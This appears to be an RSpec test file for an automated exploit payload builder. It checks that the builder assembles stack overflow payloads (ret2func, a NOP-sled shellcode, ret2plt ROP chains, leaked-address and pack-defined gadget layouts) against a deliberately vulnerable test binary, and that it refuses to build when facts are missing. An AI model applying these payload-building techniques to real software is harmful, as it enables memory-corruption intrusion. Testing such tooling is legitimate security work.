# frozen_string_literal: true

require "lictor"
require "tmpdir"

builder = ["../../augure/profiler/spec/support/binary_builder.rb",
  "../augure/profiler/spec/support/binary_builder.rb"]
  .map { |p| File.expand_path(p, __dir__) }
  .find { |p| File.file?(p) }
require_relative builder

RSpec.describe Lictor::PayloadBuilder do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }
  let(:out) { File.join(dir, "payload.bin") }

  it "builds the ret2func payload: measured padding + ret_align + the win address" do
    facts = "nx(\"true\").\npie(\"false\").\nwin_symbol(\"win\", 4196182).\n" \
            "gadget(\"ret_align\", 4196100).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "ret2func", out: out)
    expect(result[:offset]).to eq(16)
    expect(result[:offset_source]).to eq("static-frame")
    expect(result[:sink]).to eq("strcpy")
    expect(result[:ret_source]).to include("win_symbol:win")
    body = File.binread(out)
    expect(body).not_to include([4196100].pack("Q<")) # offset 16: already aligned, no gadget
    expect(body).to eq(("A" * 16).b + [4196182].pack("Q<"))
  end

  it "builds the shellcode payload: sled + jmp_rsp + the assembled shellcode" do
    facts = "nx(\"false\").\ngadget(\"jmp_rsp\", 4196200).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "shellcode", out: out)
    expect(result[:ret_source]).to include("gadget:jmp_rsp")
    body = File.binread(out)
    expect(body).to start_with(("\x90" * result[:offset]).b)
    expect(body.bytesize).to be > result[:offset] + 8
    expect(result[:size]).to eq(body.bytesize)
  end

  it "uses a custom payload file verbatim for the shellcode template" do
    custom = File.join(dir, "custom.sc")
    File.binwrite(custom, "\xcc" * 11)
    facts = "gadget(\"jmp_rsp\", 99).\n"
    described_class.build(binary: binary, facts: facts, technique: "shellcode",
      out: out, payload_file: custom)
    body = File.binread(out)
    expect(body).to end_with(("\xcc" * 11).b)
  end

  it "refuses honestly when the facts cannot drive the template" do
    expect {
      described_class.build(binary: binary, facts: "nx(\"true\").\n", technique: "ret2func", out: out)
    }.to raise_error(Lictor::PayloadBuilder::BuildError, /win_symbol/)
    expect {
      described_class.build(binary: binary, facts: "nx(\"true\").\n", technique: "heap_tcache", out: out)
    }.to raise_error(Lictor::PayloadBuilder::BuildError, /layout/)
  end
end

RSpec.describe "the leaked-address slot" do
  let(:pb) { Lictor::PayloadBuilder }
  let(:dir) { Dir.mktmpdir }
  let(:binary) do
    builder = ["../../augure/profiler/spec/support/binary_builder.rb",
      "../augure/profiler/spec/support/binary_builder.rb"]
      .map { |p| File.expand_path(p, __dir__) }
      .find { |p| File.file?(p) }
    require_relative builder
    ProfilerBinaryBuilder.vulnerable
  end
  let(:out) { File.join(dir, "payload.bin") }

  it "builds from the addresses the service leaked" do
    facts = "nx(\"true\").\npie(\"false\").\ncanary(\"false\").\n" \
            "leaked_address(\"win\", 4196182).\n"
    result = pb.build(binary: binary, facts: facts, technique: "banner_leak", out: out)
    expect(result[:ret_source]).to include("leaked_address:win@4196182")
    expect(File.binread(out)).to eq(("A" * 16).b + [4196182].pack("Q<"))
  end

  it "refuses when the service never leaked" do
    facts = "nx(\"true\").\n"
    expect {
      pb.build(binary: binary, facts: facts, technique: "banner_leak", out: out)
    }.to raise_error(Lictor::PayloadBuilder::BuildError, /harvest/)
  end
end

RSpec.describe "the pack build: section" do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }

  it "a pack technique builds with ITS layout: gadget chain then win" do
    out = File.join(dir, "p.bin")
    facts = "nx(\"true\").\npie(\"false\").\nwin_symbol(\"win\", 4196182).\ngadget(\"ret_align\", 4196100).\n"
    pack = Augure::Pack.load_hash(
      "technique" => "chain_probe", "author" => "spec", "source" => "https://example.com",
      "rules" => [{"id" => "app_chain_probe", "head" => %w[applicable chain_probe],
                   "conditions" => [["fact", "target_function", "true"]]}],
      "kb" => [{"id" => "x1", "description" => "x", "success_rate" => 0.5}],
      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
      "priors" => [1, 1],
      "build" => {"technique" => "chain_probe",
                  "layout" => [["padding"], ["qword", "gadget:ret_align"], ["qword", "win"]]}
    )
    result = Lictor::PayloadBuilder.build(binary: binary, facts: facts,
      technique: "chain_probe", out: out, packs: [pack])
    body = File.binread(out)
    expect(body).to eq(("A" * 16).b + [4196100].pack("Q<") + [4196182].pack("Q<"))
    expect(result[:ret_source]).to include("gadget:ret_align")
  end

  it "a pack teaching a NEW technique gets its layout from the pack" do
    out = File.join(dir, "n.bin")
    facts = "nx(\"true\").\npie(\"false\").\nwin_symbol(\"win\", 4196182).\n"
    pack = Augure::Pack.load_hash(
      "technique" => "fancy_probe", "author" => "spec", "source" => "https://example.com",
      "rules" => [{"id" => "app_fancy", "head" => %w[applicable fancy_probe],
                   "conditions" => [["fact", "target_function", "true"]]}],
      "kb" => [{"id" => "f1", "description" => "f", "success_rate" => 0.5}],
      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
      "priors" => [1, 1],
      "build" => {"technique" => "fancy_probe",
                  "layout" => [["padding"], ["dword", "win"]]}
    )
    Lictor::PayloadBuilder.build(binary: binary, facts: facts,
      technique: "fancy_probe", out: out, packs: [pack])
    # the dword slot is 4 bytes wide even on x64 (the width per slot)
    expect(File.binread(out)).to eq(("A" * 16).b + [4196182].pack("L<"))
  end
end

RSpec.describe Lictor::PayloadBuilder, "the chain slot" do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }

  it "composes the ret2plt leak chain from the facts (gadget, got, plt)" do
    out = File.join(dir, "p.bin")
    facts = "nx(\"true\").\npie(\"false\").\ngadget(\"pop_rdi_ret\", 4196100).\n" \
            "plt_addr(\"puts\", 4196104).\ngot_addr(\"puts\", 4196112).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "ret2plt", out: out)
    body = File.binread(out)
    expected = ("A" * 16).b + [4196100, 4196112, 4196104].pack("Q<*")
    expect(body).to eq(expected)
    expect(result[:ret_source]).to include("gadget:pop_rdi_ret")
  end

  it "resolves const literals and refuses incomplete chains loudly" do
    out = File.join(dir, "c.bin")
    facts = "nx(\"true\").\npie(\"false\").\ngadget(\"pop_rdi_ret\", 4196100).\n" \
            "plt_addr(\"puts\", 4196104).\ngot_addr(\"puts\", 4196112).\n"
    pack = Augure::Pack.load_hash(
      "technique" => "chain_const_probe", "author" => "spec", "source" => "https://example.com",
      "rules" => [{"id" => "app_ccp", "head" => %w[applicable chain_const_probe],
                   "conditions" => [["fact", "nx", "true"]]}],
      "kb" => [{"id" => "c1", "description" => "c", "success_rate" => 0.5}],
      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
      "priors" => [1, 1],
      "build" => {"technique" => "chain_const_probe",
                  "layout" => [["padding"], ["chain", "gadget:pop_rdi_ret", "const:59", "plt_addr:puts"]]}
    )
    described_class.build(binary: binary, facts: facts, technique: "chain_const_probe", out: out, packs: [pack])
    body = File.binread(out)
    expect(body).to eq(("A" * 16).b + [4196100, 59, 4196104].pack("Q<*"))
  end

  it "refuses a chain whose gadget is not in the facts" do
    out = File.join(dir, "f.bin")
    facts = "nx(\"true\").\npie(\"false\").\ngadget(\"pop_rsi_ret\", 4196100).\n"
    expect {
      described_class.build(binary: binary, facts: facts, technique: "ret2plt", out: out)
    }.to raise_error(Lictor::PayloadBuilder::BuildError, /pop_rdi_ret/)
  end
end
